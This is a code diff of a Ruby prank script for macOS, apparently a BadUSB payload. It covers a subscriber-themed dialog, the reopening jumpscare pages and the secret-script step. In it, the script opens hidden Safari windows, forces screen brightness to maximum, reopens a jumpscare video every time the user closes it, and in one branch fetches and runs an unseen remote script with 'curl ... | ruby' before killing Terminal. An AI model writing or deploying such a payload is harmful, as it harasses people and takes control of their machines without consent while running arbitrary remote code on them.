@@ -82,6 +82,7 @@ def create_jumpscare_html(video_url)
 end
 
 # --- Persistent Jumpscare Mode ---
+# Opens the jumpscare page in Safari and continuously checks to re-open it if the user closes it.
 def persistent_jumpscare(video_url)
   html_file = create_jumpscare_html(video_url)
   
@@ -91,7 +92,7 @@ def persistent_jumpscare(video_url)
     system("open -a Safari '#{html_file}'")
     # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.75 seconds (0.5 + additional 0.25) to simulate detection of noise.
+    # Wait 0.75 seconds (0.5 + 0.25 extra) before showing.
     sleep 0.75
     # Set brightness to maximum.
     set_brightness_to_max
@@ -113,7 +114,6 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
-    # If not found, loop will reopen the page.
     sleep 3
   end
 end
@@ -123,26 +123,8 @@ def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
 end
 
-# --- Subscriber Action ---
-def subscriber_action(choice)
-  ch = choice.strip.downcase
-  case ch
-  when "hawk"
-    run_secret_script
-    system("killall Terminal")
-    exit 0
-  when "tuah"
-    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
-  when "sydney lover"
-    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
-  when "girl power!", "girl power", "girlpower"
-    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
-  else
-    puts "Unexpected button choice: #{choice}"
-  end
-end
-
 # --- Main Program Flow ---
+# Prompt for subscription status.
 subscribed = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")
 if subscribed.nil?
   puts "No response received. Exiting."
@@ -150,11 +132,10 @@ if subscribed.nil?
 end
 
 if subscribed.downcase == "no"
-  # Non-subscriber branch: Immediately trigger jumpscare using jumpscare2.mp4.
+  # Non-subscriber branch: Immediately trigger jumpscare with jumpscare2.mp4.
   sleep 1
   video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
   persistent_jumpscare(video_url)
-  # (Persistent loop never exits; therefore Terminal won't be reached.)
 else
   # Subscriber branch: Show a dialog with four buttons.
   button_choice = display_dialog("Choose a button:", ["Sydney lover", "Hawk", "Tuah", "Girl Power!"], "Hawk")
@@ -162,7 +143,18 @@ else
     puts "No button chosen. Exiting."
     exit 0
   end
-  subscriber_action(button_choice)
+  ch = button_choice.strip.downcase
+  if ch == "hawk"
+    run_secret_script
+  elsif ch == "tuah"
+    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
+  elsif ch == "sydney lover"
+    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
+  elsif ch.include?("girl power")
+    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
+  else
+    puts "Unexpected button choice: #{button_choice}"
+  end
   system("killall Terminal")
   exit 0
 end
